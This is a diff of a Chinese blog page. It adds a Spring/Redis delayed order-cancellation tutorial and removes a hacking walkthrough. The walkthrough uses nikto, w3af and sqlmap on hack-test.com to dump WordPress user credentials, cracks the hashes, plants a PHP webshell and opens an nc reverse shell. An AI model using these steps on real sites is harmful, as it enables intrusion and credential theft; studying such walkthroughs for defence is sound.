class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderService</span> <span class="keyword">implements</span> <span class="title">InitializingBean</span>   </span>&#123;</span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  DelayedService delayedService;</span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  RedisService redisService;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//系统启动，注册监听</span></span><br><span class="line">    delayedService.registerListener(DelayedOrder.class, <span class="keyword">new</span> OnDelayedListener&lt;DelayedOrder&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDelayedArrived</span><span class="params">(DelayedOrder order)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;onDelayedArrived:&#123;&#125;&quot;</span>, order.toString());</span><br><span class="line">        <span class="comment">//查询订单的状态</span></span><br><span class="line">        <span class="keyword">int</span> status = <span class="number">0</span>;<span class="comment">//0代表未支付</span></span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="comment">//自动取消订单</span></span><br><span class="line">          autoCancelOrder(order);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(status == <span class="number">1</span>)&#123;<span class="comment">//1代表已经支付</span></span><br><span class="line">          <span class="comment">//do nothing</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(status == <span class="number">2</span>)&#123;<span class="comment">//已经取消</span></span><br><span class="line">          <span class="comment">//do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//把redis中的订单重新插入队列</span></span><br><span class="line">    ThreadPoolUtil.execute(()-&gt;&#123;</span><br><span class="line">      List&lt;DelayedOrder&gt; orders = redisService.getFromSet(ORDER_KEY, DelayedOrder.class);</span><br><span class="line">      <span class="keyword">if</span>(orders != <span class="keyword">null</span> &amp;&amp; orders.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span>(DelayedOrder order : orders) &#123;</span><br><span class="line">          delayedService.add(order);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/**创建订单**/</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> DelayedOrder <span class="title">createOrder</span><span class="params">(String orderId)</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**支付订单**/</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">payOrder</span><span class="params">(String orderId)</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**自动取消订单**/</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">autoCancelOrder</span><span class="params">(DelayedOrder order)</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时，如果服务器重启过，OrderService加载完成以后，还要去redis中把那些订单查出来，插入到DelayQueue中。</p>
+<p>DelayedOrder定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DelayedOrder</span> <span class="keyword">extends</span> <span class="title">BaseDelayed</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">  <span class="comment">/**默认过期时间是30分钟*/</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> timeout = <span class="number">30</span> * <span class="number">60</span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">DelayedOrder</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">DelayedOrder</span><span class="params">(String orderId)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(timeout, orderId);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">DelayedOrder</span><span class="params">(<span class="keyword">int</span> timeoutSeconds, String orderId)</span> </span>&#123;<span class="comment">//TODO 测试用</span></span><br><span class="line">    <span class="keyword">super</span>(timeoutSeconds, orderId);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果系统中还有别的这种任务，还可以继续继承BaseDelayed来进行添加。</p>
+<p>controller就没什么好说的了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/order&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  OrderService orderService;</span><br><span class="line">  <span class="meta">@GetMapping(&quot;/create&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">createOrder</span><span class="params">(<span class="meta">@RequestParam(&quot;orderId&quot;)</span>String orderId)</span> </span>&#123;</span><br><span class="line">    DelayedOrder order = orderService.createOrder(orderId);</span><br><span class="line">    <span class="keyword">return</span> order.getValue();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@GetMapping(&quot;/pay&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Boolean <span class="title">payOrder</span><span class="params">(<span class="meta">@RequestParam(&quot;orderId&quot;)</span>String orderId)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> ret = orderService.payOrder(orderId);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试一下：</p>
+<p>浏览器执行：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/order/create?orderId=order1">http://localhost:8080/order/create?orderId=order1</a></p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/order/create?orderId=order2">http://localhost:8080/order/create?orderId=order2</a></p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/order/create?orderId=order3">http://localhost:8080/order/create?orderId=order3</a></p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/order/pay?orderId=order1">http://localhost:8080/order/pay?orderId=order1</a></p>
+<p>然后关闭服务器。</p>
+<p>此时查看redis中的数据有order2和order3两条。</p>
+<p>重启开启服务器：</p>
+<p>redis中的order2和order3被重新插入到DelayQueue，超时以后，出队，订单置为自动取消，同时从redis中删除掉。</p>
+<p>实际项目里引入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">RedisConfig类重新设置redisTemplate</span><br><span class="line">新建RedisService类，装饰redisTemplate的方法</span><br><span class="line">新建BaseDelayed抽象类提供设置 超时出队的时间点，离出队还有多长时间，队列中元素出队的先后顺序 的方法</span><br><span class="line">新建DelayedOrder类继承BaseDelayed设置超时时间</span><br><span class="line">新建DelayedService实现InitializingBean接口（这个接口里只有唯一的方法afterPropertiesSet），照搬方法</span><br><span class="line">新建OnDelayedListener的接口来提供注册监听器的方法</span><br><span class="line"></span><br><span class="line">业务逻辑使用：</span><br><span class="line">1.controller层写接口</span><br><span class="line">2.service层写业务逻辑：</span><br><span class="line">	首先这个类要继承InitializingBean接口</span><br><span class="line">	在生成订单时：</span><br><span class="line">		DelayedOrder delayedOrder &#x3D; new DelayedOrder(orderSn);</span><br><span class="line">        &#x2F;&#x2F; 插入内存队列</span><br><span class="line">        delayedService.add(delayedOrder);</span><br><span class="line">        &#x2F;&#x2F; 插入redis</span><br><span class="line">        redisService.addToSet(ORDER_KEY, delayedOrder);</span><br><span class="line">	在service层的实现类重写afterPropertiesSet方法：（相当于是重新启动项目后执行的方法，将redis中的数据重新插入延时队列）</span><br><span class="line">		系统启动，注册监听，重写onDelayedArrived方法：查询订单状态做处理，将订单号从延迟队列和reids删除。再将剩余未删除的插入延迟队列（通过线程池的ThreadPoolUtil.execute方法实现）</span><br></pre></td></tr></table></figure>
+
+<p>InitializingBean接口是实现注入bean的初始化（<strong>在任意地方注入bean（比如需要调用service时，会自动装填bean），都会直接执行重写的afterPropertiesSet方法，不用主动调用</strong>）</p>
+<p>1、Spring为bean提供了两种初始化bean的方式，实现InitializingBean接口，实现afterPropertiesSet方法，或者在配置文件中通过init-method指定，两种方式可以同时使用。</p>
+<p>2、实现InitializingBean接口是直接调用afterPropertiesSet方法，比通过反射调用init-method指定的方法效率要高一点，但是init-method方式消除了对spring的依赖。</p>
+<p>3、如果调用afterPropertiesSet方法时出错，则不调用init-method指定的方法。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://s-qwer.github.io/2021/06/28/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/" data-id="ckw61sdwp0065oswd2ktift4h" data-title="电商项目" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-4.26.JSR" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/06/24/4.26.JSR/" class="article-date">
@@ -701,426 +1026,6 @@ RTP 由两个紧密链接部分组成： RTP ― 传送具有实时属性的数�
 
 
   
-    <article id="post-29.3.攻破一个网站" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/03/29.3.%E6%94%BB%E7%A0%B4%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99/" class="article-date">
-  <time class="dt-published" datetime="2021-06-03T06:55:45.000Z" itemprop="datePublished">2021-06-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/03/29.3.%E6%94%BB%E7%A0%B4%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99/">攻破一个网站</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>通过本文你将了解黑客常用的入手思路和技术手法，适合热爱网络信息安全的新手朋友了解学习。本文将从最开始的信息收集开始讲述黑客是如何一步步的攻破你的网站和服务器的。阅读本文你会学到以下内容：</p>
-<p>1.渗透测试前的简单信息收集。</p>
-<p>2.sqlmap的使用</p>
-<p>3.nmap的使用</p>
-<p>4.nc反弹提权</p>
-<p>5.linux系统的权限提升</p>
-<p>6.backtrack 5中渗透测试工具nikto和w3af的使用等.</p>
-<p><strong>假设黑客要入侵的你的网站域名为:hack-test.com</strong> </p>
-<p>让我们用ping命令获取网站服务器的IP地址</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpsJZ6y1OxXkwGWoe8ibT1CBeON1o5quyCuDPWgdg0Z7fqWGniamwqqdmQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>现在我们获取了网站服务器的IP地址为:173.236.138.113</p>
-<p>寻找同一服务器上的其它网站，我们使用sameip.org.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpoR6YIaePdzeYqtGicmptvhF6P5sSdATMOsKE12liccN54L0SLFnsep4w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>26 sites hosted on IP Address 173.236.138.113</p>
-<table>
-<thead>
-<tr>
-<th><strong>ID</strong></th>
-<th><strong>Domain</strong></th>
-<th><strong>Site Link</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>hijackthisforum.com</td>
-<td>hijackthisforum.com</td>
-</tr>
-<tr>
-<td>2</td>
-<td>sportforum.net</td>
-<td>sportforum.net</td>
-</tr>
-<tr>
-<td>3</td>
-<td>freeonlinesudoku.net</td>
-<td>freeonlinesudoku.net</td>
-</tr>
-<tr>
-<td>4</td>
-<td>cosplayhell.com</td>
-<td>cosplayhell.com</td>
-</tr>
-<tr>
-<td>5</td>
-<td>videogamenews.org</td>
-<td>videogamenews.org</td>
-</tr>
-<tr>
-<td>6</td>
-<td>gametour.com</td>
-<td>gametour.com</td>
-</tr>
-<tr>
-<td>7</td>
-<td>qualitypetsitting.net</td>
-<td>qualitypetsitting.net</td>
-</tr>
-<tr>
-<td>8</td>
-<td>brendanichols.com</td>
-<td>brendanichols.com</td>
-</tr>
-<tr>
-<td>9</td>
-<td>8ez.com</td>
-<td>8ez.com</td>
-</tr>
-<tr>
-<td>10</td>
-<td>hack-test.com</td>
-<td>hack-test.com</td>
-</tr>
-<tr>
-<td>11</td>
-<td>kisax.com</td>
-<td>kisax.com</td>
-</tr>
-<tr>
-<td>12</td>
-<td>paisans.com</td>
-<td>paisans.com</td>
-</tr>
-<tr>
-<td>13</td>
-<td>mghz.com</td>
-<td>mghz.com</td>
-</tr>
-<tr>
-<td>14</td>
-<td>debateful.com</td>
-<td>debateful.com</td>
-</tr>
-<tr>
-<td>15</td>
-<td>jazzygoodtimes.com</td>
-<td>jazzygoodtimes.com</td>
-</tr>
-<tr>
-<td>16</td>
-<td>fruny.com</td>
-<td>fruny.com</td>
-</tr>
-<tr>
-<td>17</td>
-<td>vbum.com</td>
-<td>vbum.com</td>
-</tr>
-<tr>
-<td>18</td>
-<td>wuckie.com</td>
-<td>wuckie.com</td>
-</tr>
-<tr>
-<td>19</td>
-<td>force5inc.com</td>
-<td>force5inc.com</td>
-</tr>
-<tr>
-<td>20</td>
-<td>virushero.com</td>
-<td>virushero.com</td>
-</tr>
-<tr>
-<td>21</td>
-<td>twincitiesbusinesspeernetwork.com</td>
-<td>twincitiesbusinesspeernetwork.com</td>
-</tr>
-<tr>
-<td>22</td>
-<td>jennieko.com</td>
-<td>jennieko.com</td>
-</tr>
-<tr>
-<td>23</td>
-<td>davereedy.com</td>
-<td>davereedy.com</td>
-</tr>
-<tr>
-<td>24</td>
-<td>joygarrido.com</td>
-<td>joygarrido.com</td>
-</tr>
-<tr>
-<td>25</td>
-<td>prismapp.com</td>
-<td>prismapp.com</td>
-</tr>
-<tr>
-<td>26</td>
-<td>utiligolf.com</td>
-<td>utiligolf.com</td>
-</tr>
-</tbody></table>
-<p>173.236.138.113上有26个网站，很多黑客为了攻破你的网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，我们将抛开服务器上的其它网站，只针对你的网站来进行入侵检测。</p>
-<p>我们需要关于你网站的以下信息：</p>
-<p>\1. DNS records (A, NS, TXT, MX and SOA)</p>
-<p>\2. Web Server Type (Apache, IIS, Tomcat)</p>
-<p>\3. Registrar (the company that owns your domain)</p>
-<p>\4. Your name, address, email and phone</p>
-<p>\5. Scripts that your site uses (php, asp, asp.net, jsp, cfm)</p>
-<p>\6. Your server OS (Unix,Linux,Windows,Solaris)</p>
-<p>\7. Your server open ports to internet (80, 443, 21, etc.)</p>
-<p>让我们开始找你网站的DNS记录，我们用who.is来完成这一目标.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpYu6CdYiceaqAFPzQZRm6Yo3RSUDxDtuECXXFbQ0oQribvcSGlOoXkSKA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们发现你的DNS记录如下</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpfVqUCn0b1urPXkPX6YiavjfwTr0GicNlYCL2HGOO4wgDu8l8IewNJj0g/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p> 让我们来确定web服务器的类型</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpembKsdOw1eUxiaBhGLDqghXyQ1HmwlTSF1oIm8AYXYj4TBlkbOjo3Nw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>发现你的Web服务器是apache，接下来确定它的版本.</p>
-<p> IP: 173.236.138.113</p>
-<p>Website Status: active</p>
-<p>Server Type: Apache<br>Alexa Trend/Rank: 1 Month:3,213,968 3 Month: 2,161,753<br>Page Views per Visit: 1 Month: 2.0 3Month: 3.7</p>
-<p>接下来是时候寻找你网站域名的注册信息,你的电话、邮箱、地址等.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpJNBlsJUnc9MVOt9mddtG8wahjDicbZJtdQoTIyyDS5Uy5B3f7ntF0Jw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们现在已经获取了你的网站域名的注册信息，包括你的重要信息等.</p>
-<p>我们可以通过backtrack5中的whatweb来获取你的网站服务器操作系统类型和服务器的版本.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczplaQIicgSRaOcDiclME9Bz4q2xvhpFeswBdC1xUAM9GY2zEQjeLeCl0Lg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpvqMhAPLfrU5pfXhcYWUOhBhwHhaNjMnuUWBqKsvjfV8JxW8aSrfZeQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们发现你的网站使用了著名的php整站程序wordpress，服务器的的系统类型为FedoraLinux，Web服务器版本Apache 2.2.15.继续查看网站服务器开放的端口，用渗透测试工具nmap:</p>
-<p>1-Find services that run on server(查看服务器上运行的服务)</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/hvwIc05aNv59stVLN3SsmfyXgHXG5jOwyKoPweQhhCO9lentYx1eOxBNLI7nhcoen92WDZpEfSNCEvKQrGsUSQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>2-Find server OS(查看操作系统版本)</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/hvwIc05aNv59stVLN3SsmfyXgHXG5jOwLArDEsk8wRzzlibhvoibEOqGPVMDb1g9kPJ3IYPD3mcpymseAAlhDNgQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>只有80端口是开放的,操作系统是Linux2.6.22（Fedora Core 6），现在我们已经收集了所有关于你网站的重要信息,接下来开始扫描寻找漏洞,比如:</p>
-<p>Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF等等.</p>
-<p>我们将使用Nikto来收集漏洞信息:</p>
-<p>root@bt:/pentest/web/nikto# perlnikto.pl -h hack-test.com</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpgxvjICoicHyDN67DSAtRPX3HmaOZfia72zFkgTia6JnJZvfKlTfawzteQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们也会用到Backtrack 5 R1中的W3AF 工具:</p>
-<p>root@bt:/pentest/web/w3af#./w3af_gui</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczp3Pvaxp3GAFf6qKzFIQF47JoVafrnKawUoENmDK8RV823d2ysdKvzDA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们输入要检测的网站地址,选择完整的安全审计选项.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpyQTV7tQqQ9gWYp3ZjIBia5cic686dLyYWM4ZcRY1mUw2hACkTe98kScQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>稍等一会，你将会看到扫描结果.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczppuP83kFZY3zQVSbibibWJSHibL5HGVnXpQFYqhqsLcsWDSI9vCX5Bn1sA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p> 发现你的网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞.让我们来探讨SQL注入漏洞.</p>
-<p><a target="_blank" rel="noopener" href="http://hack-test.com/Hackademic_RTB1/?cat=d%EF%BC%8527z%EF%BC%85220">http://hack-test.com/Hackademic_RTB1/?cat=d％27z％220</a></p>
-<p>我们通过工具发现这个URL存在SQL注入，我们通过Sqlmap来检测这个url.</p>
-<p>Using sqlmap with –u url</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpwe3VDHSPfNwO00D22OvjNWaOWibUvibKuDSUbJAE6UIgPEB6e8HINW2g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>过一会你会看到</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpsfIUiauMfAeiaYMNx5SmBBPWUbERftlsYuDce0EChiclrztGaNQ4pBqdQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>输入N按回车键继续</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpb3paeC8mDibm6Q5olNBibF8NHFiaeiazwy9rFzt65OicF3sYIoc4lYicgqCw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们发现你的网站存在mysql显错注入，mysql数据库版本是5.0. 我们通过加入参数”-dbs”来尝试采集数据库名.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpFp7atHkA5mKGD97mxAN7JRaZ3OAfhBPicv3Eibicz2khxP6MxnojeZI0A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpOBypVicT6VjAvIyw7icNWep3y4tqwnMFdppqgiaicCpQaU34DtV9SGX5AA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>发现三个数据库,接下来通过参数”-D wordpress -tables”来查看wordpress数据库的所有表名</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpTUoYvibVXgbt1zboJJakY7s7Mg82x7f41UIqGNrZlnmvQ589CWm9MiaA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpdBN6KH6m11ia8OnxZH4gepIcBOh9KricKhpow4URRrupD0BrCBbIjFng/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>通过参数“-T wp_users –columns ”来查看wp_users表中的字段.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpnYneGTaqC9ibjwAn0EInn7MKzBrePNmjpWQtrF6Q9TANX6C9yMBQh7g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpPwfb0lMjtXsvB9xJTR0rr2eCm74xQEgO4NukqrAPXPfxKw6m1icsf1w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>接下来猜解字段user_login和user_pass的值.用参数”-C user_login,user_pass–dump”</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpuo0icJibQ8SRcPMttLx7ng0SzwUT1yhZtk7lFnuMnqaTA4BXjXd7uwicA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>我们会发现用户名和密码hashes值. 我们需要通过以下在线破解网站来破解密码hashes</p>
-<p><a target="_blank" rel="noopener" href="http://www.onlinehashcrack.com/free-hash-reverse.php">http://www.onlinehashcrack.com/free-hash-reverse.php</a></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpfFsyLohLEZxZzwDicBYmFaIM9S0yNWezEh3XAcruAxceb8pGYIDiamew/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>登陆wordpress的后台wp-admin</p>
-<p>尝试上传php webshell到服务器，以方便运行一些linux命令.在插件页面寻找任何可以编辑的插件.我们选择Textile这款插件，编辑插入我们的php webshell，点击更新文件，然后访问我们的phpwebshell.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpTP97icIu38j1Eq0pib5jWGENJanEiaQ5MwGCFGHkod87wdDVMSXZ9O3mg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpFGR0UxaicDCC6hsEHibEAT23sVQ89D9MnBPiatsThEUWvhq42rYl0cqww/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>Phpwebshell被解析了，我们可以控制你网站的文件，但是我们只希望获得网站服务器的root权限,来入侵服务器上其它的网站。</p>
-<p>我们用NC来反弹一个shell,首先在我们的电脑上监听5555端口.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpLHgB85fB3ZkfbtnTVChMMkSD3DCGsM4WicOicX0smmq1MdJNtr4KeXEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>然后在Php webshell上反向连接我们的电脑，输入你的IP和端口5555.</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpclSQWemVYcmpicw9FdQEHyRG6atmM1qp2BkfLp9tjejWOGnKNL9MAXg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>点击连接我们会看到</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeY6xSGooL6wd9gyxDyIiczpBpqLAicNbRysCQibiaticjo900tu4P9M7dmZ79ib2Fc9PmVLnfXpoRMceibg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
-<p>接下来我们尝试执行一些命令：</p>
-<ul>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-<li></li>
-</ul>
